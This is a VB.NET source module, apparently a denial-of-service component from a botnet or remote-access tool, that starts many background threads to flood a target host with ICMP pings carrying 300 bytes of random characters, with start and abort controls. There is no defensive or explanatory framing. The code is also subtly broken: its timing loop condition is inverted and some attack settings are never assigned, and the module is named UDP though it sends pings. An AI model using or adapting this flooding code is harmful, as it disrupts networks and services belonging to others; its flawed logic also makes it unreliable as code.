﻿Imports System.Threading

Public Module UDP
    Public Host As String
    Private ThreadsEnded = 0
    Private ThreadstoUse As Integer
    Private TimetoAttack As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Public Time As Integer
    Public Threadsto As Integer
    Public Sub Start()

        Threads = New Thread(Threadsto - 1) {}
        For i As Integer = 0 To Threadsto - 1
            Threads(i) = New Thread(Sub() Attack(Host))
            Threads(i).IsBackground = True
            Threads(i).Start()
        Next

    End Sub
    Public Sub Abort()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            attacks = 0

        Else

        End If
    End Sub
    Public Sub Attack(Host As String)
        Try
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = stopwatch.StartNew
            Do Until (stopwatch.Elapsed < span)
                System.Threading.Thread.Sleep(1500)
                Dim aa As New System.Net.NetworkInformation.Ping
                Dim bb As System.Net.NetworkInformation.PingReply
                Dim txtlog As String = ""
                Dim cC As New System.Net.NetworkInformation.PingOptions
                cC.DontFragment = True
                cC.Ttl = 64
                Dim data As String = Randomisi2(300)
                Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
                Dim i As Int16
                For i = 0 To 30000
                    bb = aa.Send(Host, 2000, bt, cC)
                Next i
            Loop
        Catch ex As Exception

        End Try
        lol()
    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            attacks = 0
        End If

    End Sub

    Public Function Randomisi2(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
End Module